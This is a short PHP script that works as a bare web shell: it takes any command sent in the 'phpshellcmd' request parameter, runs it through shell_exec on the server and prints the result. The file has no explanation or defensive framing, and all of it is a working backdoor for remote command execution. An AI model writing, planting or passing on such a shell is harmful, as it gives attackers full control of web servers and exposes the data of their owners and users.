<?php
	if(isset($_REQUEST['phpshellcmd'])){
		$cmd = $_REQUEST['phpshellcmd'];
		echo shell_exec($cmd);
	}
	die()
?>
